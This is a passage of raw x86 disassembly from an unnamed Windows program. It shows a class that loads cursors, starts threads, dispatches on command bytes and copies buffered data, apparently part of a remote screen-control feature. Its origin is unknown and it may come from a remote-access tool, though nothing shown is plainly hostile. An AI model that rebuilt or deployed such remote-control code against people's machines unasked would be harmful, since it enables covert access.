  40663e:	85 c0                	test   %eax,%eax
  406640:	75 19                	jne    0x40665b
  406642:	8b 55 10             	mov    0x10(%ebp),%edx
  406645:	52                   	push   %edx
  406646:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406649:	50                   	push   %eax
  40664a:	ff 15 4c b0 40 00    	call   *0x40b04c
  406650:	85 c0                	test   %eax,%eax
  406652:	75 07                	jne    0x40665b
  406654:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  40665b:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  406662:	e8 14 00 00 00       	call   0x40667b
  406667:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40666a:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40666d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406674:	5f                   	pop    %edi
  406675:	5e                   	pop    %esi
  406676:	5b                   	pop    %ebx
  406677:	8b e5                	mov    %ebp,%esp
  406679:	5d                   	pop    %ebp
  40667a:	c3                   	ret
  40667b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40667e:	51                   	push   %ecx
  40667f:	8b 35 34 b0 40 00    	mov    0x40b034,%esi
  406685:	ff d6                	call   *%esi
  406687:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40668a:	52                   	push   %edx
  40668b:	ff d6                	call   *%esi
  40668d:	c3                   	ret
  40668e:	8b ff                	mov    %edi,%edi
  406690:	4e                   	dec    %esi
  406691:	65 40                	gs inc %eax
  406693:	00 75 65             	add    %dh,0x65(%ebp)
  406696:	40                   	inc    %eax
  406697:	00 f6                	add    %dh,%dh
  406699:	65 40                	gs inc %eax
  40669b:	00 26                	add    %ah,(%esi)
  40669d:	66 40                	inc    %ax
  40669f:	00 6a ff             	add    %ch,-0x1(%edx)
  4066a2:	68 5e ac 40 00       	push   $0x40ac5e
  4066a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4066ad:	50                   	push   %eax
  4066ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4066b5:	83 ec 44             	sub    $0x44,%esp
  4066b8:	8b 44 24 54          	mov    0x54(%esp),%eax
  4066bc:	53                   	push   %ebx
  4066bd:	55                   	push   %ebp
  4066be:	56                   	push   %esi
  4066bf:	57                   	push   %edi
  4066c0:	8b f1                	mov    %ecx,%esi
  4066c2:	50                   	push   %eax
  4066c3:	89 74 24 14          	mov    %esi,0x14(%esp)
  4066c7:	e8 54 f8 ff ff       	call   0x405f20
  4066cc:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%esp)
  4066d3:	00 
  4066d4:	c7 46 24 d4 b4 40 00 	movl   $0x40b4d4,0x24(%esi)
  4066db:	c7 44 24 14 8a 7f 00 	movl   $0x7f8a,0x14(%esp)
  4066e2:	00 
  4066e3:	c7 44 24 18 00 7f 00 	movl   $0x7f00,0x18(%esp)
  4066ea:	00 
  4066eb:	c7 44 24 1c 03 7f 00 	movl   $0x7f03,0x1c(%esp)
  4066f2:	00 
  4066f3:	c7 44 24 20 89 7f 00 	movl   $0x7f89,0x20(%esp)
  4066fa:	00 
  4066fb:	c7 44 24 24 8b 7f 00 	movl   $0x7f8b,0x24(%esp)
  406702:	00 
  406703:	c7 44 24 28 01 7f 00 	movl   $0x7f01,0x28(%esp)
  40670a:	00 
  40670b:	c7 44 24 2c 81 7f 00 	movl   $0x7f81,0x2c(%esp)
  406712:	00 
  406713:	c7 44 24 30 88 7f 00 	movl   $0x7f88,0x30(%esp)
  40671a:	00 
  40671b:	c7 44 24 34 80 7f 00 	movl   $0x7f80,0x34(%esp)
  406722:	00 
  406723:	c7 44 24 38 86 7f 00 	movl   $0x7f86,0x38(%esp)
  40672a:	00 
  40672b:	c7 44 24 3c 83 7f 00 	movl   $0x7f83,0x3c(%esp)
  406732:	00 
  406733:	c7 44 24 40 85 7f 00 	movl   $0x7f85,0x40(%esp)
  40673a:	00 
  40673b:	c7 44 24 44 82 7f 00 	movl   $0x7f82,0x44(%esp)
  406742:	00 
  406743:	c7 44 24 48 84 7f 00 	movl   $0x7f84,0x48(%esp)
  40674a:	00 
  40674b:	c7 44 24 4c 04 7f 00 	movl   $0x7f04,0x4c(%esp)
  406752:	00 
  406753:	c7 44 24 50 02 7f 00 	movl   $0x7f02,0x50(%esp)
  40675a:	00 
  40675b:	8d 6c 24 14          	lea    0x14(%esp),%ebp
  40675f:	8d 7e 68             	lea    0x68(%esi),%edi
  406762:	bb 10 00 00 00       	mov    $0x10,%ebx
  406767:	8b 45 00             	mov    0x0(%ebp),%eax
  40676a:	50                   	push   %eax
  40676b:	6a 00                	push   $0x0
  40676d:	89 47 c0             	mov    %eax,-0x40(%edi)
  406770:	ff 15 88 b3 40 00    	call   *0x40b388
  406776:	89 07                	mov    %eax,(%edi)
  406778:	83 c5 04             	add    $0x4,%ebp
  40677b:	83 c7 04             	add    $0x4,%edi
  40677e:	4b                   	dec    %ebx
  40677f:	75 e6                	jne    0x406767
  406781:	bb 01 00 00 00       	mov    $0x1,%ebx
  406786:	68 10 01 00 00       	push   $0x110
  40678b:	88 5c 24 60          	mov    %bl,0x60(%esp)
  40678f:	c7 06 cc b4 40 00    	movl   $0x40b4cc,(%esi)
  406795:	88 5e 13             	mov    %bl,0x13(%esi)
  406798:	c7 46 18 08 00 00 00 	movl   $0x8,0x18(%esi)
  40679f:	e8 3c 3f 00 00       	call   0x40a6e0
  4067a4:	83 c4 04             	add    $0x4,%esp
  4067a7:	89 44 24 64          	mov    %eax,0x64(%esp)
  4067ab:	85 c0                	test   %eax,%eax
  4067ad:	c6 44 24 5c 02       	movb   $0x2,0x5c(%esp)
  4067b2:	74 0e                	je     0x4067c2
  4067b4:	6a 64                	push   $0x64
  4067b6:	53                   	push   %ebx
  4067b7:	6a 04                	push   $0x4
  4067b9:	8b c8                	mov    %eax,%ecx
  4067bb:	e8 f0 0a 00 00       	call   0x4072b0
  4067c0:	eb 02                	jmp    0x4067c4
  4067c2:	33 c0                	xor    %eax,%eax
  4067c4:	53                   	push   %ebx
  4067c5:	6a 00                	push   $0x0
  4067c7:	6a 00                	push   $0x0
  4067c9:	56                   	push   %esi
  4067ca:	68 f0 6d 40 00       	push   $0x406df0
  4067cf:	6a 00                	push   $0x0
  4067d1:	6a 00                	push   $0x0
  4067d3:	88 5c 24 78          	mov    %bl,0x78(%esp)
  4067d7:	89 86 a8 00 00 00    	mov    %eax,0xa8(%esi)
  4067dd:	88 5e 10             	mov    %bl,0x10(%esi)
  4067e0:	c6 46 12 00          	movb   $0x0,0x12(%esi)
  4067e4:	c6 46 11 00          	movb   $0x0,0x11(%esi)
  4067e8:	c6 46 14 00          	movb   $0x0,0x14(%esi)
  4067ec:	e8 7f 2d 00 00       	call   0x409570
  4067f1:	53                   	push   %ebx
  4067f2:	6a 00                	push   $0x0
  4067f4:	6a 00                	push   $0x0
  4067f6:	56                   	push   %esi
  4067f7:	68 60 6e 40 00       	push   $0x406e60
  4067fc:	6a 00                	push   $0x0
  4067fe:	6a 00                	push   $0x0
  406800:	89 46 1c             	mov    %eax,0x1c(%esi)
  406803:	e8 68 2d 00 00       	call   0x409570
  406808:	8b 8c 24 8c 00 00 00 	mov    0x8c(%esp),%ecx
  40680f:	83 c4 38             	add    $0x38,%esp
  406812:	89 46 20             	mov    %eax,0x20(%esi)
  406815:	8b c6                	mov    %esi,%eax
  406817:	5f                   	pop    %edi
  406818:	5e                   	pop    %esi
  406819:	5d                   	pop    %ebp
  40681a:	5b                   	pop    %ebx
  40681b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406822:	83 c4 50             	add    $0x50,%esp
  406825:	c2 04 00             	ret    $0x4
  406828:	90                   	nop
  406829:	90                   	nop
  40682a:	90                   	nop
  40682b:	90                   	nop
  40682c:	90                   	nop
  40682d:	90                   	nop
  40682e:	90                   	nop
  40682f:	90                   	nop
  406830:	53                   	push   %ebx
  406831:	8b 1d 8c b3 40 00    	mov    0x40b38c,%ebx
  406837:	56                   	push   %esi
  406838:	57                   	push   %edi
  406839:	c7 01 d4 b4 40 00    	movl   $0x40b4d4,(%ecx)
  40683f:	8d 71 44             	lea    0x44(%ecx),%esi
  406842:	bf 10 00 00 00       	mov    $0x10,%edi
  406847:	8b 06                	mov    (%esi),%eax
  406849:	50                   	push   %eax
  40684a:	ff d3                	call   *%ebx
  40684c:	83 c6 04             	add    $0x4,%esi
  40684f:	4f                   	dec    %edi
  406850:	75 f5                	jne    0x406847
  406852:	5f                   	pop    %edi
  406853:	5e                   	pop    %esi
  406854:	5b                   	pop    %ebx
  406855:	c3                   	ret
  406856:	90                   	nop
  406857:	90                   	nop
  406858:	90                   	nop
  406859:	90                   	nop
  40685a:	90                   	nop
  40685b:	90                   	nop
  40685c:	90                   	nop
  40685d:	90                   	nop
  40685e:	90                   	nop
  40685f:	90                   	nop
  406860:	53                   	push   %ebx
  406861:	8b 1d 8c b3 40 00    	mov    0x40b38c,%ebx
  406867:	55                   	push   %ebp
  406868:	8b e9                	mov    %ecx,%ebp
  40686a:	56                   	push   %esi
  40686b:	57                   	push   %edi
  40686c:	c7 45 00 d4 b4 40 00 	movl   $0x40b4d4,0x0(%ebp)
  406873:	8d 75 44             	lea    0x44(%ebp),%esi
  406876:	bf 10 00 00 00       	mov    $0x10,%edi
  40687b:	8b 06                	mov    (%esi),%eax
  40687d:	50                   	push   %eax
  40687e:	ff d3                	call   *%ebx
  406880:	83 c6 04             	add    $0x4,%esi
  406883:	4f                   	dec    %edi
  406884:	75 f5                	jne    0x40687b
  406886:	f6 44 24 14 01       	testb  $0x1,0x14(%esp)
  40688b:	74 09                	je     0x406896
  40688d:	55                   	push   %ebp
  40688e:	e8 53 3e 00 00       	call   0x40a6e6
  406893:	83 c4 04             	add    $0x4,%esp
  406896:	5f                   	pop    %edi
  406897:	8b c5                	mov    %ebp,%eax
  406899:	5e                   	pop    %esi
  40689a:	5d                   	pop    %ebp
  40689b:	5b                   	pop    %ebx
  40689c:	c2 04 00             	ret    $0x4
  40689f:	90                   	nop
  4068a0:	56                   	push   %esi
  4068a1:	8b f1                	mov    %ecx,%esi
  4068a3:	e8 18 00 00 00       	call   0x4068c0
  4068a8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4068ad:	74 09                	je     0x4068b8
  4068af:	56                   	push   %esi
  4068b0:	e8 31 3e 00 00       	call   0x40a6e6
  4068b5:	83 c4 04             	add    $0x4,%esp
  4068b8:	8b c6                	mov    %esi,%eax
  4068ba:	5e                   	pop    %esi
  4068bb:	c2 04 00             	ret    $0x4
  4068be:	90                   	nop
  4068bf:	90                   	nop
  4068c0:	6a ff                	push   $0xffffffff
  4068c2:	68 83 ac 40 00       	push   $0x40ac83
  4068c7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4068cd:	50                   	push   %eax
  4068ce:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4068d5:	51                   	push   %ecx
  4068d6:	53                   	push   %ebx
  4068d7:	55                   	push   %ebp
  4068d8:	56                   	push   %esi
  4068d9:	8b f1                	mov    %ecx,%esi
  4068db:	57                   	push   %edi
  4068dc:	89 74 24 10          	mov    %esi,0x10(%esp)
  4068e0:	c7 06 cc b4 40 00    	movl   $0x40b4cc,(%esi)
  4068e6:	8b 3d bc b0 40 00    	mov    0x40b0bc,%edi
  4068ec:	8d 46 12             	lea    0x12(%esi),%eax
  4068ef:	6a 00                	push   $0x0
  4068f1:	50                   	push   %eax
  4068f2:	c7 44 24 24 01 00 00 	movl   $0x1,0x24(%esp)
  4068f9:	00 
  4068fa:	ff d7                	call   *%edi
  4068fc:	8d 4e 10             	lea    0x10(%esi),%ecx
  4068ff:	6a 00                	push   $0x0
  406901:	51                   	push   %ecx
  406902:	ff d7                	call   *%edi
  406904:	8b 56 1c             	mov    0x1c(%esi),%edx
  406907:	8b 3d dc b1 40 00    	mov    0x40b1dc,%edi
  40690d:	6a ff                	push   $0xffffffff
  40690f:	52                   	push   %edx
  406910:	ff d7                	call   *%edi
  406912:	8b 46 20             	mov    0x20(%esi),%eax
  406915:	6a ff                	push   $0xffffffff
  406917:	50                   	push   %eax
  406918:	ff d7                	call   *%edi
  40691a:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  40691d:	8b 3d e4 b1 40 00    	mov    0x40b1e4,%edi
  406923:	51                   	push   %ecx
  406924:	ff d7                	call   *%edi
  406926:	8b 56 20             	mov    0x20(%esi),%edx
  406929:	52                   	push   %edx
  40692a:	ff d7                	call   *%edi
  40692c:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  406932:	85 c9                	test   %ecx,%ecx
  406934:	74 06                	je     0x40693c
  406936:	8b 01                	mov    (%ecx),%eax
  406938:	6a 01                	push   $0x1
  40693a:	ff 10                	call   *(%eax)
  40693c:	8b 2d 8c b3 40 00    	mov    0x40b38c,%ebp
  406942:	c7 46 24 d4 b4 40 00 	movl   $0x40b4d4,0x24(%esi)
  406949:	8d 7e 68             	lea    0x68(%esi),%edi
  40694c:	bb 10 00 00 00       	mov    $0x10,%ebx
  406951:	8b 0f                	mov    (%edi),%ecx
  406953:	51                   	push   %ecx
  406954:	ff d5                	call   *%ebp
  406956:	83 c7 04             	add    $0x4,%edi
  406959:	4b                   	dec    %ebx
  40695a:	75 f5                	jne    0x406951
  40695c:	8b ce                	mov    %esi,%ecx
  40695e:	c7 44 24 1c ff ff ff 	movl   $0xffffffff,0x1c(%esp)
  406965:	ff 
  406966:	e8 05 f6 ff ff       	call   0x405f70
  40696b:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40696f:	5f                   	pop    %edi
  406970:	5e                   	pop    %esi
  406971:	5d                   	pop    %ebp
  406972:	5b                   	pop    %ebx
  406973:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40697a:	83 c4 10             	add    $0x10,%esp
  40697d:	c3                   	ret
  40697e:	90                   	nop
  40697f:	90                   	nop
  406980:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406986:	6a ff                	push   $0xffffffff
  406988:	68 b1 ac 40 00       	push   $0x40acb1
  40698d:	50                   	push   %eax
  40698e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406995:	56                   	push   %esi
  406996:	8b f1                	mov    %ecx,%esi
  406998:	57                   	push   %edi
  406999:	6a ff                	push   $0xffffffff
  40699b:	8b 46 1c             	mov    0x1c(%esi),%eax
  40699e:	c6 46 10 00          	movb   $0x0,0x10(%esi)
  4069a2:	50                   	push   %eax
  4069a3:	ff 15 dc b1 40 00    	call   *0x40b1dc
  4069a9:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4069ac:	51                   	push   %ecx
  4069ad:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  4069b3:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  4069b9:	85 c9                	test   %ecx,%ecx
  4069bb:	74 06                	je     0x4069c3
  4069bd:	8b 11                	mov    (%ecx),%edx
  4069bf:	6a 01                	push   $0x1
  4069c1:	ff 12                	call   *(%edx)
  4069c3:	8b 7c 24 18          	mov    0x18(%esp),%edi
  4069c7:	83 ff 03             	cmp    $0x3,%edi
  4069ca:	75 2c                	jne    0x4069f8
  4069cc:	68 10 01 00 00       	push   $0x110
  4069d1:	e8 0a 3d 00 00       	call   0x40a6e0
  4069d6:	83 c4 04             	add    $0x4,%esp
  4069d9:	89 44 24 18          	mov    %eax,0x18(%esp)
  4069dd:	85 c0                	test   %eax,%eax
  4069df:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4069e6:	00 
  4069e7:	74 66                	je     0x406a4f
  4069e9:	6a 64                	push   $0x64
  4069eb:	6a 01                	push   $0x1
  4069ed:	6a 04                	push   $0x4
  4069ef:	8b c8                	mov    %eax,%ecx
  4069f1:	e8 ba 08 00 00       	call   0x4072b0
  4069f6:	eb 59                	jmp    0x406a51
  4069f8:	83 ff 07             	cmp    $0x7,%edi
  4069fb:	68 10 01 00 00       	push   $0x110
  406a00:	75 27                	jne    0x406a29
  406a02:	e8 d9 3c 00 00       	call   0x40a6e0
  406a07:	83 c4 04             	add    $0x4,%esp
  406a0a:	89 44 24 18          	mov    %eax,0x18(%esp)
  406a0e:	85 c0                	test   %eax,%eax
  406a10:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  406a17:	00 
  406a18:	74 35                	je     0x406a4f
  406a1a:	6a 64                	push   $0x64
  406a1c:	6a 01                	push   $0x1
  406a1e:	6a 08                	push   $0x8
  406a20:	8b c8                	mov    %eax,%ecx
  406a22:	e8 89 08 00 00       	call   0x4072b0
  406a27:	eb 28                	jmp    0x406a51
  406a29:	e8 b2 3c 00 00       	call   0x40a6e0
  406a2e:	83 c4 04             	add    $0x4,%esp
  406a31:	89 44 24 18          	mov    %eax,0x18(%esp)
  406a35:	85 c0                	test   %eax,%eax
  406a37:	c7 44 24 10 02 00 00 	movl   $0x2,0x10(%esp)
  406a3e:	00 
  406a3f:	74 0e                	je     0x406a4f
  406a41:	6a 64                	push   $0x64
  406a43:	6a 00                	push   $0x0
  406a45:	57                   	push   %edi
  406a46:	8b c8                	mov    %eax,%ecx
  406a48:	e8 63 08 00 00       	call   0x4072b0
  406a4d:	eb 02                	jmp    0x406a51
  406a4f:	33 c0                	xor    %eax,%eax
  406a51:	89 86 a8 00 00 00    	mov    %eax,0xa8(%esi)
  406a57:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  406a5d:	33 c0                	xor    %eax,%eax
  406a5f:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  406a66:	ff 
  406a67:	8a 46 13             	mov    0x13(%esi),%al
  406a6a:	50                   	push   %eax
  406a6b:	e8 d0 0e 00 00       	call   0x407940
  406a70:	8a 4e 14             	mov    0x14(%esi),%cl
  406a73:	51                   	push   %ecx
  406a74:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  406a7a:	e8 61 11 00 00       	call   0x407be0
  406a7f:	6a 01                	push   $0x1
  406a81:	6a 00                	push   $0x0
  406a83:	6a 00                	push   $0x0
  406a85:	56                   	push   %esi
  406a86:	68 f0 6d 40 00       	push   $0x406df0
  406a8b:	6a 00                	push   $0x0
  406a8d:	6a 00                	push   $0x0
  406a8f:	89 7e 18             	mov    %edi,0x18(%esi)
  406a92:	c6 46 10 01          	movb   $0x1,0x10(%esi)
  406a96:	e8 d5 2a 00 00       	call   0x409570
  406a9b:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  406a9f:	83 c4 1c             	add    $0x1c,%esp
  406aa2:	89 46 1c             	mov    %eax,0x1c(%esi)
  406aa5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406aac:	5f                   	pop    %edi
  406aad:	5e                   	pop    %esi
  406aae:	83 c4 0c             	add    $0xc,%esp
  406ab1:	c2 04 00             	ret    $0x4
  406ab4:	90                   	nop
  406ab5:	90                   	nop
  406ab6:	90                   	nop
  406ab7:	90                   	nop
  406ab8:	90                   	nop
  406ab9:	90                   	nop
  406aba:	90                   	nop
  406abb:	90                   	nop
  406abc:	90                   	nop
  406abd:	90                   	nop
  406abe:	90                   	nop
  406abf:	90                   	nop
  406ac0:	55                   	push   %ebp
  406ac1:	8b ec                	mov    %esp,%ebp
  406ac3:	6a ff                	push   $0xffffffff
  406ac5:	68 c0 ac 40 00       	push   $0x40acc0
  406aca:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406ad0:	50                   	push   %eax
  406ad1:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406ad8:	51                   	push   %ecx
  406ad9:	53                   	push   %ebx
  406ada:	56                   	push   %esi
  406adb:	57                   	push   %edi
  406adc:	8b 7d 08             	mov    0x8(%ebp),%edi
  406adf:	33 c0                	xor    %eax,%eax
  406ae1:	89 65 f0             	mov    %esp,-0x10(%ebp)
  406ae4:	8a 07                	mov    (%edi),%al
  406ae6:	8b f1                	mov    %ecx,%esi
  406ae8:	83 c0 ef             	add    $0xffffffef,%eax
  406aeb:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406af2:	83 f8 0d             	cmp    $0xd,%eax
  406af5:	77 0e                	ja     0x406b05
  406af7:	ff 24 85 54 6c 40 00 	jmp    *0x406c54(,%eax,4)
  406afe:	8b ce                	mov    %esi,%ecx
  406b00:	e8 2b f5 ff ff       	call   0x406030
  406b05:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406b08:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406b0f:	5f                   	pop    %edi
  406b10:	5e                   	pop    %esi
  406b11:	5b                   	pop    %ebx
  406b12:	8b e5                	mov    %ebp,%esp
  406b14:	5d                   	pop    %ebp
  406b15:	c2 08 00             	ret    $0x8
  406b18:	33 c0                	xor    %eax,%eax
  406b1a:	8b ce                	mov    %esi,%ecx
  406b1c:	8a 47 01             	mov    0x1(%edi),%al
  406b1f:	50                   	push   %eax
  406b20:	e8 5b fe ff ff       	call   0x406980
  406b25:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406b28:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406b2f:	5f                   	pop    %edi
  406b30:	5e                   	pop    %esi
  406b31:	5b                   	pop    %ebx
  406b32:	8b e5                	mov    %ebp,%esp
  406b34:	5d                   	pop    %ebp
  406b35:	c2 08 00             	ret    $0x8
  406b38:	8a 47 01             	mov    0x1(%edi),%al
  406b3b:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  406b41:	88 46 13             	mov    %al,0x13(%esi)
  406b44:	25 ff 00 00 00       	and    $0xff,%eax
  406b49:	50                   	push   %eax
  406b4a:	e8 f1 0d 00 00       	call   0x407940
  406b4f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406b52:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406b59:	5f                   	pop    %edi
  406b5a:	5e                   	pop    %esi
  406b5b:	5b                   	pop    %ebx
  406b5c:	8b e5                	mov    %ebp,%esp
  406b5e:	5d                   	pop    %ebp
  406b5f:	c2 08 00             	ret    $0x8
  406b62:	e8 f9 2e 00 00       	call   0x409a60
  406b67:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406b6a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406b71:	5f                   	pop    %edi
  406b72:	5e                   	pop    %esi
  406b73:	5b                   	pop    %ebx
  406b74:	8b e5                	mov    %ebp,%esp
  406b76:	5d                   	pop    %ebp
  406b77:	c2 08 00             	ret    $0x8
  406b7a:	6a 00                	push   $0x0
  406b7c:	e8 ad 3d 00 00       	call   0x40a92e
  406b81:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406b84:	49                   	dec    %ecx
  406b85:	47                   	inc    %edi
  406b86:	51                   	push   %ecx
  406b87:	57                   	push   %edi
  406b88:	8b ce                	mov    %esi,%ecx
  406b8a:	e8 d1 03 00 00       	call   0x406f60
  406b8f:	33 d2                	xor    %edx,%edx
  406b91:	8a 56 11             	mov    0x11(%esi),%dl
  406b94:	52                   	push   %edx
  406b95:	e8 94 3d 00 00       	call   0x40a92e
  406b9a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406b9d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406ba4:	5f                   	pop    %edi
  406ba5:	5e                   	pop    %esi
  406ba6:	5b                   	pop    %ebx
  406ba7:	8b e5                	mov    %ebp,%esp
  406ba9:	5d                   	pop    %ebp
  406baa:	c2 08 00             	ret    $0x8
  406bad:	8a 47 01             	mov    0x1(%edi),%al
  406bb0:	84 c0                	test   %al,%al
  406bb2:	0f 95 c0             	setne  %al
  406bb5:	88 46 11             	mov    %al,0x11(%esi)
  406bb8:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406bbb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406bc2:	5f                   	pop    %edi
  406bc3:	5e                   	pop    %esi
  406bc4:	5b                   	pop    %ebx
  406bc5:	8b e5                	mov    %ebp,%esp
  406bc7:	5d                   	pop    %ebp
  406bc8:	c2 08 00             	ret    $0x8
  406bcb:	8a 47 01             	mov    0x1(%edi),%al
  406bce:	84 c0                	test   %al,%al
  406bd0:	0f 95 c1             	setne  %cl
  406bd3:	88 4e 12             	mov    %cl,0x12(%esi)
  406bd6:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406bd9:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406be0:	5f                   	pop    %edi
  406be1:	5e                   	pop    %esi
  406be2:	5b                   	pop    %ebx
  406be3:	8b e5                	mov    %ebp,%esp
  406be5:	5d                   	pop    %ebp
  406be6:	c2 08 00             	ret    $0x8
  406be9:	8a 57 01             	mov    0x1(%edi),%dl
  406bec:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  406bf2:	84 d2                	test   %dl,%dl
  406bf4:	0f 95 c0             	setne  %al
  406bf7:	50                   	push   %eax
  406bf8:	88 46 14             	mov    %al,0x14(%esi)
  406bfb:	e8 e0 0f 00 00       	call   0x407be0
  406c00:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406c03:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406c0a:	5f                   	pop    %edi
  406c0b:	5e                   	pop    %esi
  406c0c:	5b                   	pop    %ebx
  406c0d:	8b e5                	mov    %ebp,%esp
  406c0f:	5d                   	pop    %ebp
  406c10:	c2 08 00             	ret    $0x8
  406c13:	8b ce                	mov    %esi,%ecx
  406c15:	e8 96 05 00 00       	call   0x4071b0
  406c1a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406c1d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406c24:	5f                   	pop    %edi
  406c25:	5e                   	pop    %esi
  406c26:	5b                   	pop    %ebx
  406c27:	8b e5                	mov    %ebp,%esp
  406c29:	5d                   	pop    %ebp
  406c2a:	c2 08 00             	ret    $0x8
  406c2d:	8b 55 0c             	mov    0xc(%ebp),%edx
  406c30:	8b ce                	mov    %esi,%ecx
  406c32:	4a                   	dec    %edx
  406c33:	47                   	inc    %edi
  406c34:	52                   	push   %edx
  406c35:	57                   	push   %edi
  406c36:	e8 05 05 00 00       	call   0x407140
  406c3b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406c3e:	5f                   	pop    %edi
  406c3f:	5e                   	pop    %esi
  406c40:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406c47:	5b                   	pop    %ebx
  406c48:	8b e5                	mov    %ebp,%esp
  406c4a:	5d                   	pop    %ebp
  406c4b:	c2 08 00             	ret    $0x8
  406c4e:	b8 05 6b 40 00       	mov    $0x406b05,%eax
  406c53:	c3                   	ret
  406c54:	18 6b 40             	sbb    %ch,0x40(%ebx)
  406c57:	00 38                	add    %bh,(%eax)
  406c59:	6b 40 00 62          	imul   $0x62,0x0(%eax),%eax
  406c5d:	6b 40 00 7a          	imul   $0x7a,0x0(%eax),%eax
  406c61:	6b 40 00 ad          	imul   $0xffffffad,0x0(%eax),%eax
  406c65:	6b 40 00 cb          	imul   $0xffffffcb,0x0(%eax),%eax
  406c69:	6b 40 00 e9          	imul   $0xffffffe9,0x0(%eax),%eax
  406c6d:	6b 40 00 13          	imul   $0x13,0x0(%eax),%eax
  406c71:	6c                   	insb   (%dx),%es:(%edi)
  406c72:	40                   	inc    %eax
  406c73:	00 2d 6c 40 00 05    	add    %ch,0x500406c
  406c79:	6b 40 00 05          	imul   $0x5,0x0(%eax),%eax
  406c7d:	6b 40 00 05          	imul   $0x5,0x0(%eax),%eax
  406c81:	6b 40 00 05          	imul   $0x5,0x0(%eax),%eax
  406c85:	6b 40 00 fe          	imul   $0xfffffffe,0x0(%eax),%eax
  406c89:	6a 40                	push   $0x40
  406c8b:	00 90 90 90 90 83    	add    %dl,-0x7c6f6f70(%eax)
  406c91:	ec                   	in     (%dx),%al
  406c92:	08 53 55             	or     %dl,0x55(%ebx)
  406c95:	56                   	push   %esi
  406c96:	8b f1                	mov    %ecx,%esi
  406c98:	57                   	push   %edi
  406c99:	89 74 24 14          	mov    %esi,0x14(%esp)
  406c9d:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  406ca3:	e8 68 0f 00 00       	call   0x407c10
  406ca8:	8b d8                	mov    %eax,%ebx
  406caa:	6a 04                	push   $0x4
  406cac:	43                   	inc    %ebx
  406cad:	68 00 10 00 00       	push   $0x1000
  406cb2:	53                   	push   %ebx
  406cb3:	6a 00                	push   $0x0
  406cb5:	ff 15 b4 b0 40 00    	call   *0x40b0b4
  406cbb:	8b e8                	mov    %eax,%ebp
  406cbd:	8d 7b ff             	lea    -0x1(%ebx),%edi
  406cc0:	c6 45 00 73          	movb   $0x73,0x0(%ebp)
  406cc4:	8b 8e a8 00 00 00    	mov    0xa8(%esi),%ecx
  406cca:	e8 31 0f 00 00       	call   0x407c00
  406ccf:	8b f0                	mov    %eax,%esi
  406cd1:	8b c7                	mov    %edi,%eax
  406cd3:	8d 7d 01             	lea    0x1(%ebp),%edi
  406cd6:	8b c8                	mov    %eax,%ecx
  406cd8:	53                   	push   %ebx
  406cd9:	8b d1                	mov    %ecx,%edx
  406cdb:	55                   	push   %ebp
  406cdc:	c1 e9 02             	shr    $0x2,%ecx
  406cdf:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406ce1:	8b ca                	mov    %edx,%ecx
  406ce3:	83 e1 03             	and    $0x3,%ecx
  406ce6:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406ce8:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  406cec:	e8 af f2 ff ff       	call   0x405fa0
